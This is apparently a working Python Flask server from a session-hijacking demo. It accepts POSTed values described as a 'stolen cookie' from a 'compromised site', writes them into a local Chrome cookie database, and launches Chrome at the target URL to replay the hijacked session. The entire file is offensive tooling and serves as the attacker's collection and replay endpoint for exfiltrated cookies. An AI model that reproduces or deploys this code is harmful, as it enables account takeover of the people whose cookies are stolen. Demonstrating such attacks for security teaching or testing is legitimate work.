import sys
from subprocess import Popen

import validators

from flask import Flask, request, render_template

from sqlalchemy.ext.automap import automap_base
from sqlalchemy.orm import Session
from sqlalchemy import create_engine

"""
Hardcoded UTC dates for the cookie. Easier than generating them on the fly
since Chrome's database uses the creation_utc as the cookie's primary key
and we want to delete any spurious cookies we stored previously.
"""
CREATION_UTC = 13120468750054245
EXPIRES_UTC = 13435828750000000
ACCESSED_UTC = 13133004531246831

app = Flask(__name__)

if len(sys.argv) < 2:
    print("Usage: python3 server.py <PATH_TO_CHROME_COOKIE_DATABASE>")
    sys.exit(1)

engine = create_engine("sqlite:///{}".format(sys.argv[1]))
Base = automap_base()
Base.prepare(engine, reflect=True)

Cookie = Base.classes.cookies

session = Session(engine)


@app.route("/")
def home():
    return "POST cookies in /cookie_jar"


def create_cookie(url, name, value):
    cookie = Cookie(
        host_key=url,
        name=name,
        value="",
        path="/",
        secure=0,
        httponly=0,
        encrypted_value=value.encode("utf-8"),
        creation_utc=CREATION_UTC,
        expires_utc=EXPIRES_UTC,
        last_access_utc=ACCESSED_UTC)
    return cookie


@app.route("/cookie_jar", methods=["POST"])
def store_cookie():
    """
    Store a cookie in Chrome's database and open the browser to the target url

    Expects a POST request with the following data:
    url - the url of the compromised site
    cookie_name - the name of the stolen cookie
    cookie_value - the value of the stolen cookie
    """
    url = request.form.get("url")
    cookie_name = request.form.get("cookie_name")
    cookie_value = request.form.get("cookie_value")

    # validate the url to prevent arbitrary shell execution
    # TODO: whitelist domains/ips to prevent visiting arbitrary urls
    if not validators.url(url) and not validators.url("http://" + url):
        return "INVALID URL: {}".format(url)

    # delete previously stored cookies using the creation_utc
    for cookie in session.query(Cookie).filter(
            Cookie.creation_utc == CREATION_UTC):
        session.delete(cookie)
    session.commit()

    cookie = create_cookie(url, cookie_name, cookie_value)

    session.add(cookie)
    session.commit()

    # open chrome at the target site to demonstrate the stolen cookie
    Popen(["google-chrome", "{}".format(url)])

    return "Success\n"


if __name__ == "__main__":
    app.run()
